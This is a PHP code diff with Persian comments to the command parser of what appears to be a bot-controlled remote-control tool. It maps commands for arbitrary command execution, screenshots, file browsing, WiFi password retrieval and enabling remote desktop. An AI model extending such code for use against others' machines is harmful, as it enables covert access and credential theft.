@@ -258,6 +258,7 @@ class CallbackQueryHandler
         }
     }
 
+    // در تابع detectCommandType، بخش commandMap را آپدیت کنید:
     private function detectCommandType(string $command): string
     {
         $commandMap = [
@@ -265,17 +266,17 @@ class CallbackQueryHandler
             '/screenshot' => 'capture_screenshot',
             '/exec' => 'system_command',
             '/browse' => 'file_operation',
-            '/get-info' => 'system_info',
+            '/get-info' => 'system_info',          // ✅ اضافه شد
             '/go' => 'open_url',
             '/shutdown' => 'system_command',
             '/restart' => 'system_command',
             '/sleep' => 'system_command',
             '/signout' => 'system_command',
-            '/tasks' => 'process_management',
-            '/end_task' => 'end_task',
-            '/enable_rdp' => 'enable_rdp',
-            '/disable_rdp' => 'disable_rdp',
-            '/getwifipasswords' => 'get_wifi_passwords',
+            '/tasks' => 'process_management',      // ✅ اضافه شد
+            '/end_task' => 'end_task',             // ✅ اضافه شد
+            '/enable_rdp' => 'enable_rdp',         // ✅ اضافه شد
+            '/disable_rdp' => 'disable_rdp',       // ✅ اضافه شد
+            '/getwifipasswords' => 'get_wifi_passwords', // ✅ اضافه شد
         ];
 
         foreach ($commandMap as $cmd => $type) {
@@ -291,15 +292,71 @@ class CallbackQueryHandler
     {
         $params = [];
 
+        // دستور /exec - اجرای دستور سیستم
         if (preg_match('/^\/exec\s+(.+)$/', $command, $matches)) {
             $params['command'] = trim($matches[1]);
-        } elseif (preg_match('/^\/browse\s+(.+)$/', $command, $matches)) {
+        }
+
+        // دستور /browse - مرور فایل‌ها
+        elseif (preg_match('/^\/browse\s+(.+)$/', $command, $matches)) {
             $params['action'] = 'list';
             $params['path'] = trim($matches[1]);
-        } elseif (preg_match('/^\/end_task\s+(.+)$/', $command, $matches)) {
+        }
+
+        // دستور /end_task - پایان دادن به تسک
+        elseif (preg_match('/^\/end_task\s+(.+)$/', $command, $matches)) {
             $params['process_name'] = trim($matches[1]);
-        } elseif (preg_match('/^\/go\s+(.+)$/', $command, $matches)) {
+        }
+
+        // دستور /go - باز کردن URL
+        elseif (preg_match('/^\/go\s+(.+)$/', $command, $matches)) {
             $params['url'] = trim($matches[1]);
+        }
+
+        // دستور /tasks - لیست فرآیندها
+        elseif (str_starts_with($command, '/tasks')) {
+            $params['action'] = 'list';
+        }
+
+        // دستور /get-info - اطلاعات سیستم
+        elseif (str_starts_with($command, '/get-info')) {
+            $params['action'] = 'full';
+        }
+
+        // دستور /getwifipasswords - دریافت پسوردهای WiFi
+        elseif (str_starts_with($command, '/getwifipasswords')) {
+            $params['action'] = 'all';
+        }
+
+        // دستور /enable_rdp - فعال‌سازی RDP
+        elseif (str_starts_with($command, '/enable_rdp')) {
+            $params['action'] = 'enable';
+        }
+
+        // دستور /disable_rdp - غیرفعال‌سازی RDP
+        elseif (str_starts_with($command, '/disable_rdp')) {
+            $params['action'] = 'disable';
+        }
+
+        // دستورات مدیریت سیستم
+        elseif (str_starts_with($command, '/shutdown')) {
+            $params['command'] = 'shutdown';
+        } elseif (str_starts_with($command, '/restart')) {
+            $params['command'] = 'restart';
+        } elseif (str_starts_with($command, '/sleep')) {
+            $params['command'] = 'sleep';
+        } elseif (str_starts_with($command, '/signout')) {
+            $params['command'] = 'signout';
+        }
+
+        // دستور /status - وضعیت سیستم
+        elseif (str_starts_with($command, '/status')) {
+            $params['action'] = 'check';
+        }
+
+        // دستور /screenshot - گرفتن عکس از صفحه
+        elseif (str_starts_with($command, '/screenshot')) {
+            $params['action'] = 'capture';
         }
 
         return $params;
